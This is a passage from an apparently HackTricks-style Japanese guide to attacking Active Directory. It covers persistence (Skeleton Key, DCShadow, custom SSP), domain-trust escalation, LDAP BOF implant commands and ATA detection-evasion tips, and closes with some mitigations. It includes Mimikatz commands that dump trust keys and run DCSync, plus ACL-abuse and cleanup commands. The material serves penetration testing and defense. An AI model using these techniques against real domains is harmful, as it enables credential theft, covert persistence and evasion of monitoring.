Active Directory の **AdminSDHolder** オブジェクトは、これらのグループに対して標準の **Access Control List (ACL)** を適用することで、**特権グループ**（Domain Admins や Enterprise Admins など）のセキュリティを確保し、不正な変更を防ぎます。しかし、この機能は悪用される可能性があります。攻撃者が AdminSDHolder の ACL を変更して通常ユーザーにフルアクセスを与えると、そのユーザーはすべての特権グループに対して広範な制御を得てしまいます。この保護機能は、厳重に監視されない限り逆効果になり、不当なアクセスを許してしまう可能性があります。

[**AdminSDHolder グループに関する詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** には **ローカル管理者** アカウントが存在します。そのようなマシンで管理者権限を取得すれば、**mimikatz** を使ってローカル管理者の hash を抽出できます。その後、リモートでローカル Administrator アカウントにアクセスするために、このパスワードの使用を**有効にする**レジストリ変更が必要になります。

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL 永続化

特定のドメインオブジェクトに対してユーザーに**特殊な権限**を付与することで、そのユーザーが**将来権限を昇格**できるようにすることができます。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### セキュリティ記述子

**セキュリティ記述子**はオブジェクトが持つ**権限**を格納するために使用されます。オブジェクトのセキュリティ記述子に**小さな変更**を加えるだけで、そのオブジェクトに対して非常に興味深い権限を得ることができ、特権グループのメンバーである必要がなくなります。

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

メモリ内の **LSASS** を改変して**ユニバーサルパスワード**を設定し、すべてのドメインアカウントへアクセス可能にします。

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider) とは何かはこちらで学んでください。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成して、マシンにアクセスするために使用される資格情報を**平文 (clear text)** で**捕獲**することができます。

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD に**新しい Domain Controller** を登録し、それを使って指定したオブジェクトに対して属性（SIDHistory、SPNs...）を**ログを残すことなく**プッシュします。**DA** 権限とルートドメイン内にいることが必要です。\
なお、誤ったデータを使用するとかなり醜いログが出力される点に注意してください。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS 永続化

前述の通り、**LAPS パスワードを読み取る十分な権限**があれば権限昇格する方法について説明しました。しかし、これらのパスワードは**永続化の維持**にも利用できます。\
参照:

{{#ref}}
laps.md
{{#endref}}

## フォレスト権限昇格 - ドメイントラスト

Microsoft は **Forest** をセキュリティ境界と見なしています。つまり、**単一のドメインを侵害することでフォレスト全体が危険にさらされる可能性がある**ということです。

### 基本情報

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、あるドメインのユーザーが別のドメインのリソースにアクセスすることを可能にするセキュリティ機構です。これは両ドメインの認証システムを連結し、認証確認がシームレスに流れるようにします。ドメインがトラストを設定すると、両方の Domain Controller (DC) に特定の**キー**が交換・保持され、トラストの整合性にとって重要になります。

典型的なシナリオでは、ユーザーが**信頼されたドメイン**内のサービスにアクセスするには、まず自ドメインの DC から特別なチケットである **inter-realm TGT** を要求する必要があります。この inter-realm TGT は両ドメインが合意した共有の**trust key**で暗号化されます。ユーザーはその TGT を **Domain 2 の Domain Controller (DC2)** に提示して、Domain 2 内のサービスに対するサービスチケット（TGS）を取得します。trusted domain の DC が inter-realm TGT を検証すると、要求されたサービスに対して TGS を発行します。最後に、クライアントはこの TGS をサーバーに提示し、サーバーのアカウントハッシュで暗号化された TGS により Domain 2 のサービスへのアクセスが得られます。

手順:

1. **Domain 1** の **クライアントコンピュータ** が NTLM **hash** を使用して自ドメインの **Domain Controller (DC1)** から **Ticket Granting Ticket (TGT)** を要求してプロセスを開始します。
2. クライアントが正しく認証されれば、DC1 は新しい TGT を発行します。
3. クライアントは次に **Domain 2** のリソースにアクセスするために DC1 から **inter-realm TGT** を要求します。
4. inter-realm TGT は、2 ドメイン間の双方向トラストの一部として DC1 と DC2 間で共有される **trust key** で暗号化されます。
5. クライアントは inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に持参します。
6. DC2 は共有 trust key を用いて inter-realm TGT を検証し、有効であればクライアントがアクセスしようとする Domain 2 内のサーバーに対する **Ticket Granting Service (TGS)** を発行します。
7. 最後にクライアントはこの TGS をサーバーに提示し、サーバー側ではその TGS がサーバーのアカウントハッシュで暗号化されているため、サービスへのアクセスが得られます。

### トラストの種類

重要な点は、**トラストは一方向 (1 way) または双方向 (2 ways) になり得る**ということです。双方向トラストの場合、両方のドメインは互いを信頼しますが、**一方向**のトラスト関係では一方が **trusted** で他方が **trusting** になります。この場合、**trusted 側から見て trusting ドメイン内のリソースにのみアクセスできる**という制約があります。

もし Domain A が Domain B を信頼するなら、A が trusting domain、B が trusted domain です。さらに、**Domain A** ではこれは **Outbound trust**、**Domain B** では **Inbound trust** となります。

**異なるトラスト関係の例**

- **Parent-Child Trusts**: 同一フォレスト内で一般的な構成で、子ドメインは親ドメインと自動的に双方向の推移的トラストを持ちます。親と子の間で認証要求がシームレスに流れます。
- **Cross-link Trusts**: 「shortcut trusts」とも呼ばれ、子ドメイン間の参照処理を高速化するために設定されます。複雑なフォレストでは認証参照がルートまで上がってからターゲットドメインまで下がる必要がありますが、cross-link を作ることでその経路を短縮できます。
- **External Trusts**: 関連のない異なるドメイン間で設定されるトラストで、非推移的です。Microsoft のドキュメントによれば、external trusts はフォレストトラストで接続されていない外部ドメインのリソースにアクセスするために有用です。セキュリティは SID フィルタリングによって強化されます。
- **Tree-root Trusts**: フォレストルートドメインと新しく追加されたツリールート間で自動的に確立されるトラストです。新しいドメインツリーをフォレストに追加する際に重要で、固有のドメイン名を維持しつつ双方向の推移性を確保します。
- **Forest Trusts**: これは 2 つのフォレストルートドメイン間の双方向推移的トラストで、SID フィルタリングを適用してセキュリティを強化します。
- **MIT Trusts**: 非 Windows の、[RFC4120 準拠](https://tools.ietf.org/html/rfc4120) の Kerberos ドメインとのトラストです。Windows 以外の Kerberos ベースのシステムと連携する環境向けの専門的なトラストです。

#### 信頼関係のその他の違い

- トラスト関係は **推移的 (transitive)**（A が B を信頼し、B が C を信頼すれば A は C を信頼する）または **非推移的** に設定できます。
- トラスト関係は **双方向トラスト**（両方が互いを信頼）または **一方向トラスト**（一方のみが他方を信頼）として設定できます。

### 攻撃経路

1. 信頼関係を**列挙**する
2. どの **security principal**（user/group/computer）が**他ドメインのリソースにアクセス**できるかを確認する（ACE エントリや他ドメインのグループのメンバーになっているか等）。**ドメイン間の関係**を探す（トラストはおそらくこれを目的に作成されている）。
1. この場合 kerberoast なども別のオプションになり得ます。
3. ドメイン間を**ピボット**できるアカウントを**侵害**する。

攻撃者は、別ドメインのリソースへアクセスするために主に以下の 3 つのメカニズムを利用できます:

- **Local Group Membership**: プリンシパルがマシンの “Administrators” グループなどのローカルグループに追加されている場合、そのマシンに対して強力な制御を得ます。
- **Foreign Domain Group Membership**: プリンシパルが外部ドメインのグループのメンバーになっている場合もあります。ただし、この方法の有効性はトラストの性質やグループのスコープに依存します。
- **Access Control Lists (ACLs)**: プリンシパルが特定のリソースにアクセスするために **DACL の ACE** に指定されていることがあります。ACL、DACL、ACE のメカニクスをより深く学びたい場合は、白書 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” が非常に参考になります。

### 権限を持つ外部ユーザー／グループの検索

ドメイン内の外部セキュリティプリンシパルを見つけるには **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認できます。これらは外部のドメイン／フォレストからのユーザー／グループです。

これを Bloodhound で確認するか、powerview を使用して確認できます:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメインのトラストを列挙する他の方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 信頼されたキーが**2つ**あります。1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されているものは、次のコマンドで確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

信頼関係を悪用して SID-History injection により、child/parent ドメインへ Enterprise admin として昇格します:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) がどのように悪用され得るかを理解することは重要です。Configuration NC は、Active Directory (AD) 環境におけるフォレスト全体の構成データの中央リポジトリとして機能します。このデータはフォレスト内のすべての Domain Controller (DC) に複製され、writable DCs は Configuration NC の書き込み可能なコピーを保持します。これを悪用するには、**SYSTEM privileges on a DC**、できれば child DC の権限が必要です。

**Link GPO to root DC site**

Configuration NC の Sites コンテナには、AD フォレスト内のすべてのドメイン参加コンピュータのサイト情報が含まれます。任意の DC 上で SYSTEM 権限を持って操作することで、攻撃者は GPOs を root DC site にリンクできます。この操作により、これらのサイトに適用されるポリシーを操作して root ドメインを危険にさらす可能性があります。

詳細は、[Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) の調査を参照してください。

**Compromise any gMSA in the forest**

攻撃ベクターの一つは、ドメイン内の権限の高い gMSA を狙うことです。gMSA のパスワードを計算するために必要な KDS Root key は Configuration NC に格納されています。任意の DC 上で SYSTEM 権限があれば、KDS Root key にアクセスしてフォレスト全体の任意の gMSA のパスワードを算出することが可能です。

詳細な解析とステップバイステップのガイドは次を参照してください：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な delegated MSA 攻撃（BadSuccessor — migration attributes の悪用）:


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の外部研究: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

この手法は、新しい権限の高い AD オブジェクトの作成を待つなどの忍耐を要します。SYSTEM 権限があれば、攻撃者は AD Schema を変更して任意のユーザにすべてのクラスに対する完全な制御を付与できます。これにより、新たに作成された AD オブジェクトに対する不正アクセスや制御が発生する可能性があります。

詳細は [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) を参照してください。

**From DA to EA with ADCS ESC5**

ADCS ESC5 の脆弱性は Public Key Infrastructure (PKI) オブジェクトの制御を狙い、フォレスト内の任意のユーザとして認証できる証明書テンプレートを作成することを可能にします。PKI オブジェクトは Configuration NC に存在するため、書き込み可能な child DC を侵害することで ESC5 攻撃を実行できます。

詳細は [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) を参照してください。ADCS が存在しない場合でも、攻撃者は必要な構成要素を設定することができます（詳しくは [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) を参照）。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインは外部のドメインから信頼されており**、それにより**不明な権限**が与えられています。あなたは、**あなたのドメインのどのプリンシパルが外部ドメインに対してどのアクセス権を持っているか**を見つけ出し、それを悪用できるか試す必要があります：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向 (アウトバウンド)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは **your domain** が **different domains** のプリンシパルに対していくつかの **privileges** を **trusting** しています。

しかし、ある **domain is trusted** が trusting domain によって設定されると、trusted domain は **creates a user** を **predictable name** で作成し、**password the trusted password** をパスワードとして使用します。つまり、**access a user from the trusting domain to get inside the trusted one** することで、trusted domain を列挙し、さらに特権昇格を試みることが可能になります:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain を侵害する別の方法としては、domain trust の **opposite direction** に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることがあります（これはあまり一般的ではありません）。

trusted domain を侵害する別の方法は、**user from the trusted domain can access** して **RDP** でログインできるマシンで待ち構えることです。攻撃者はその後 RDP セッションのプロセスにコードを注入し、そこから **access the origin domain of the victim** することができます。\
さらに、もし **victim mounted his hard drive** 場合は、**RDP session** プロセスから攻撃者が **backdoors** をハードドライブの **startup folder of the hard drive** に保存することができます。この手法は **RDPInception.** と呼ばれます。

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイントラスト悪用の緩和策

### **SID Filtering:**

- SID history 属性を横断する攻撃リスクは **SID Filtering** によって軽減されます。**SID Filtering** はすべての inter-forest trusts でデフォルトで有効になっています。これは Microsoft の立場に従い、セキュリティ境界をドメインではなくフォレストとして扱うという前提に支えられています。
- ただし注意点として、**SID Filtering** はアプリケーションやユーザーのアクセスを阻害する可能性があり、そのために一時的に無効化されることがあります。

### **Selective Authentication:**

- inter-forest trusts に対して **Selective Authentication** を適用すると、両フォレストのユーザーが自動的に認証されることはなくなります。代わりに、trusting domain やフォレスト内のドメインやサーバーへアクセスするためには明示的な権限が必要になります。
- これらの対策は、writable Configuration Naming Context (NC) の悪用や trust account に対する攻撃からは保護しない点に注意してください。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-Host インプラントからの LDAP ベースの AD 悪用

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は bloodyAD-style の LDAP プリミティブを x64 Beacon Object Files として再実装しており、これらはオンホストインプラント内（例: Adaptix C2）で完全に実行されます。オペレータはパックを `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` でコンパイルし、`ldap.axs` をロードしてから Beacon 上で `ldap <subcommand>` を呼び出します。すべてのトラフィックは現在のログオンセキュリティコンテキストで LDAP (389) の signing/sealing または LDAPS (636) の自動証明書信頼を利用するため、socks プロキシやディスク上の痕跡は不要です。

### インプラント側 LDAP 列挙

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, および `get-groupmembers` は短縮名や OU パスをフル DN に解決し、対応するオブジェクトをダンプします。
- `get-object`, `get-attribute`, および `get-domaininfo` は任意の属性（security descriptors を含む）や `rootDSE` からのフォレスト／ドメインのメタデータを取得します。
- `get-uac`, `get-spn`, `get-delegation`, および `get-rbcd` は roasting candidates、delegation 設定、および LDAP から直接取得される既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) ディスクリプタを露出します。
- `get-acl` と `get-writable --detailed` は DACL を解析して trustees、権限（GenericAll/WriteDACL/WriteOwner/attribute writes）、および継承を一覧化し、ACL 特権昇格の即時のターゲットを提示します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP の書き込みプリミティブ（escalation & persistence）

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) により、オペレータは OU 権限がある場所に新しいプリンシパルやマシンアカウントを配置できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は write-property 権限が見つかればターゲットを直接ハイジャックします。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync` のような ACL 中心のコマンドは、任意の AD オブジェクトに対する WriteDACL/WriteOwner をパスワードリセット、グループメンバーシップ制御、または DCSync レプリケーション権限に変換し、PowerShell/ADSI の痕跡を残さずに実行できます。`remove-*` 系のコマンドは注入した ACE をクリーンアップします。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` は侵害されたユーザーを即座に Kerberoastable にします。`add-asreproastable`（UAC トグル）はパスワードに触れずに AS-REP roasting の対象にマークします。
- Delegation マクロ（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は beacon から `msDS-AllowedToDelegateTo`、UAC フラグ、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD の攻撃経路を可能にし、リモート PowerShell や RSAT を使う必要を排します。

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` は特権 SID を制御下のプリンシパルの SID history に注入します（参照: [SID-History Injection](sid-history-injection.md)）。これにより LDAP/LDAPS のみでステルスにアクセス継承が可能になります。
- `move-object` はコンピュータやユーザーの DN/OU を変更し、攻撃者が資産を既に委任権限のある OU に移動してから `set-password`、`add-groupmember`、`add-spn` を悪用できるようにします。
- `remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` などの厳密にスコープされた削除コマンドは、オペレータがクレデンシャルや持続性を収集した後に迅速にロールバックしてテレメトリを最小化できます。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins は Domain Controller にのみログインを許可し、他のホストでの使用を避けることが推奨されます。
- **Service Account Privileges**: サービスは Domain Admin (DA) 特権で実行すべきではありません。
- **Temporal Privilege Limitation**: DA 特権を要するタスクについては、その期間を制限するべきです。例: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075 を監査し、その後 DC/クライアントで LDAP signing と LDAPS channel binding を強制して LDAP MITM/relay の試行を阻止します。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- ディセプションの実装は、パスワードが期限切れにならない、または Trusted for Delegation にマークされたデコイユーザーやコンピュータなどの罠を仕掛けることを含みます。具体的には特定の権利を持つユーザーを作成したり、高権限グループに追加したりします。
- 実用例: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- ディセプション技術の配備については [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **Identifying Deception**

- **For User Objects**: 疑わしい指標には、異常な ObjectSID、稀なログオン、作成日時、低い bad password カウントなどがあります。
- **General Indicators**: 潜在的なデコイオブジェクトの属性を本物のオブジェクトと比較することで不整合を明らかにできます。ツール例: [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 検出を避けるために Domain Controller 上でのセッション列挙を避ける。
- **Ticket Impersonation**: チケット生成に **aes** キーを利用すると、NTLM にダウングレードせず検出を回避しやすくなります。
- **DCSync Attacks**: Domain Controller から直接実行するとアラートが発生するため、非 Domain Controller からの実行が推奨されます。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
